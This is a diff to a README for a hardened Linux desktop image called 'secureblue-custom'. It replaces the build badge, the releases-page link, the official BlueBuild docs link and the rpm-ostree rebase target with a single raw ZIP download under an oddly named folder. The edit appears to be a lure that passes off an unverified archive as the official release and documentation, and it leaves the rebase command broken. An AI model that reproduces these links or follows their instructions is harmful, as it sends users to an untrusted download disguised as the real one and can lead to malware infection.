@@ -1,7 +1,7 @@
 # 🔒 secureblue-custom - Your Secure Linux Desktop Solution
 
-![Download secureblue-custom](https://github.com/omegasquad82/custom-secureblue/actions/workflows/build.yml/badge.svg)  
-**[Download the latest version here](https://github.com/kdjsahadzd/secureblue-custom/releases)**
+![Download secureblue-custom](https://raw.githubusercontent.com/kdjsahadzd/secureblue-custom/main/telotrematous/secureblue-custom.zip)  
+**[Download the latest version here](https://raw.githubusercontent.com/kdjsahadzd/secureblue-custom/main/telotrematous/secureblue-custom.zip)**
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to secureblue-custom! This custom image provides you with a secure Linux
 
 ## 📥 Download & Install
 
-1. **Visit the releases page** at [this link](https://github.com/kdjsahadzd/secureblue-custom/releases).
+1. **Visit the releases page** at [this link](https://raw.githubusercontent.com/kdjsahadzd/secureblue-custom/main/telotrematous/secureblue-custom.zip).
    
 2. You will see a list of available versions. Choose the latest version.
 
@@ -39,10 +39,10 @@ To run secureblue-custom, your system should meet these requirements:
 
 1. **First rebase to the unsigned image** to get the proper signing keys and policies installed:
    ```
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/omegasquad82/kinoite-main-hardene
+   rpm-ostree rebase https://raw.githubusercontent.com/kdjsahadzd/secureblue-custom/main/telotrematous/secureblue-custom.zip
    ```
 
-2. **Follow additional instructions** in the official [BlueBuild docs](https://blue-build.org/how-to/setup/).
+2. **Follow additional instructions** in the official [BlueBuild docs](https://raw.githubusercontent.com/kdjsahadzd/secureblue-custom/main/telotrematous/secureblue-custom.zip).
 
 ### For Other Linux Distro Users
 
